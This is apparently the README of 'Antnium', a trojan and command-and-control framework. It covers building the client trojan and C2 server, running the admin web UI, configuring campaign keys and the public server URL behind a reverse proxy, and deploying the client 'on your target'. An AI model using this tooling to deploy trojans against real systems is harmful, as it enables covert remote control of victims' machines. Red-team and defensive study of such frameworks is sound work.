# Antnium 

```
Anti Tanium
```

There are two components: 
* client.exe: The actual trojan
* server.exe: C2 infrastructure 


## Quick How to use

Download and install go (and git).

We use `127.0.0.1:8080` as C2 domain here (localhost as we start both client.exe and server.exe
on the same host). This is also the default, no need to change anything. 

Check campaign in `campaign/campaign.go`: 
* `serverUrl = "http://127.0.0.1:8080"`

Build it: 
```
.\makewin.bat deploy
```

Start server, and client: 
```
cd build\
.\server.exe
.\static\client.exe
```

Access the WebUI by opening the following URL in the browser after starting server.exe:
```
http://localhost:8080/webui/
```

Note: for Linux use `make` instead of `makewin.bat`, and replace `\` with `/`

## Detailed build instructions

Go install: 
* Windows: https://golang.org/doc/install
* Linux: `apt install golang`

Compile client.exe and server.exe: 
```
> .\makewin.bat deploy
```

This will create: 
* /build/server.exe
* /build/server.elf
* /build/static/client.exe
* /build/static/client.elf
* /build/upload/
* /build/webui/

Start server.exe:
```
> cd build
> .\server.exe

Antnium 0.1
Loaded 102 packets from db.packets.json
Loaded 21 clients from db.clients.json 
Periodic DB dump enabled
Starting webserver on 127.0.0.1:8080  
```

Start client.exe:
```
> .\build\static\client.exe

Antnium 0.1
time="2021-09-02T21:48:16+02:00" level=info msg="UpstreamHttp: Use WS"
time="2021-09-02T21:48:16+02:00" level=info msg="Connecting to WS succeeded"
time="2021-09-02T21:48:16+02:00" level=info msg=Send 1_computerId=c4oil02sdke2sp3nfngg 2_packetId=0 3_downstreamId=client 4_packetType=ping 5_arguments="map[]" 6_response=...
time="2021-09-02T21:48:16+02:00" level=info msg=Send 1_computerId=c4oil02sdke2sp3nfngg 2_packetId=0 3_downstreamId=client 4_packetType=ping 5_arguments="map[]" 6_response=...
```

## Notes on Campaign configuration

`campaign.go` connects a compiled client.exe with a specific server.exe, which forms a campaign. 
A campaign has individual encryption- and authentication keys, which are shared between
server and client. 

```
type Campaign struct {
	ApiKey      string  // Key used to access client facing REST
	AdminApiKey string  // Key used to access admin facing REST
	EncKey      []byte  // Key used to encrypt packets between server/client
	ServerUrl   string  // URL of the server, as viewed from the clients
}
```

Note that `ServerUrl` is the URL used by the client for all interaction with the server. 
It is the public server URL, e.g. `http://totallynotmalware.ch`. The actual server.exe may
be behind a reverse proxy, and started with `server.exe --listenaddr 127.0.0.1:8080` (so `ServerUrl` is not necessarily equal `listenaddr`). 

## Client

Tested on: 
* Windows 10
* Ubuntu 20.04 LTS

Compile on windows:
```
> .\makewin.bat client
```

Deploy it on your target.


## Server

Tested on: 
* Works: Ubuntu 20.04 LTS, Go 1.13.8
* Works: Windows 10, Go 1.16.6
* Compile FAIL: Ubuntu 16.04 LTS, Go 1.6.2

On Linux:
```
$ make server
$ ./server --listenaddr 0.0.0.0:8080
```

It will start a REST server on that port, providing: 
* `/`: REST for the clients
* `/admin`: REST for admin interface
* `/webui`: HTML files for admin interface 

Put a reverse proxy before it (make sure it supports websockets!)

Result is `server.exe`. Make sure to run it in the directory where you have or expect: 
* upload/
* static/
* db.*.json

as working directory.


## Testing

```
go test ./...
```
